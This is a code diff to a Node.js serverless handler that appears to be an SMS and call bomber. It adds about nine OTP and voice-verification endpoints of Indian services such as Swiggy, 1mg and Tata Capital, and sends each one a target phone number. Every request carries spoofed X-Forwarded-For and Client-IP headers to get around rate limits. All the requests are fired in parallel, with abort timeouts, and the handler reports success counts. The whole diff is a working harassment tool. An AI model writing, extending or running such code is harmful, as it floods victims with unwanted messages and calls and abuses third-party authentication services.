@@ -67,16 +67,113 @@ module.exports = async (req, res) => {
           "X-Forwarded-For": ipAddress,
           "Client-IP": ipAddress
         }
+      },
+      {
+        endpoint: "https://api.doubtnut.com/v4/student/login",
+        method: "POST",
+        payload: {
+          app_version: "7.10.51",
+          phone_number: phoneNumber,
+          language: "en"
+        },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://www.nobroker.in/api/v3/account/otp/send",
+        method: "POST",
+        payload: `phone=${phoneNumber}&countryCode=IN`,
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        method: "POST",
+        payload: { mobileNumber: phoneNumber },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        method: "POST",
+        payload: { phone: phoneNumber, isOtpViaCallAtLogin: "true" },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+        method: "POST",
+        payload: { organizationId: "5eb393ee95fab7468a79d189", mobile: phoneNumber },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://www.1mg.com/auth_api/v6/create_token",
+        method: "POST",
+        payload: { number: phoneNumber, otp_on_call: true },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        method: "POST",
+        payload: { mobile: phoneNumber },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        method: "POST",
+        payload: { phone_number: { number: phoneNumber, country_code: "+91" } },
+        headers: {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
+      },
+      {
+        endpoint: "https://api.servetel.in/v1/auth/otp",
+        method: "POST",
+        payload: `mobile_number=${phoneNumber}`,
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Forwarded-For": ipAddress,
+          "Client-IP": ipAddress
+        }
       }
     ];
 
-    // Send requests to all APIs
+    // Send requests to all APIs with timeout
     const requests = apis.map(async (api) => {
       try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 5000);
+
         const options = {
           method: api.method,
           headers: api.headers,
-          timeout: 5000
+          signal: controller.signal
         };
 
         if (api.method === 'POST') {
@@ -88,6 +185,8 @@ module.exports = async (req, res) => {
         }
 
         const response = await fetch(api.endpoint, options);
+        clearTimeout(timeout);
+        
         return {
           endpoint: api.endpoint,
           status: response.status,
@@ -97,7 +196,7 @@ module.exports = async (req, res) => {
         return {
           endpoint: api.endpoint,
           status: null,
-          error: error.message,
+          error: error.name === 'AbortError' ? 'Timeout' : error.message,
           success: false
         };
       }
@@ -109,6 +208,7 @@ module.exports = async (req, res) => {
     res.json({
       success: true,
       activeAPIs,
+      totalAPIs: apis.length,
       results
     });
 
